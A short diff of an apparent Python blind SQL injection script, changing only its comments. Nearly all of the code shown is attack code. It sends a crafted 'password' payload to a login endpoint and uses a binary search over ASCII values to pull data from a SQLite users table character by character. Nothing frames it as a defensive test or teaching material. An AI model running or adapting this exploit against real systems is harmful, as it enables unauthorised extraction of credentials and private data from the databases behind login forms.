@@ -20,7 +20,7 @@ def sql_test(val,url,headers,payload,position_letter):
 	val = '"'+chr(int(val))+'"'
 	content = { 
 		"username":"user2",
-		#ICI EXEMPLE DE FAILLE SQL SUR LE CHAMPS PASSWORD AVEC SQLite
+		#EXAMPLE WITH BLIND SQL INJECTION WITH SQLite
 		"password":"qqqqqqq' OR (SELECT hex(substr("+str(payload)+","+str(position_letter)+",1)) FROM users limit 2 offset 1) < hex("+val+") OR '21213'='213213",
 			}
 	attack = requests.post(url, data=content, headers=headers, proxies=proxies)
@@ -29,7 +29,7 @@ def sql_test(val,url,headers,payload,position_letter):
 		return 1
 	else :
 		return 0
-
+#THERE IS THE DICHOTOMY ALGORITHM
 for position_letter in result_lenght :
 	ascii_inf = 0
 	ascii_sup = 127
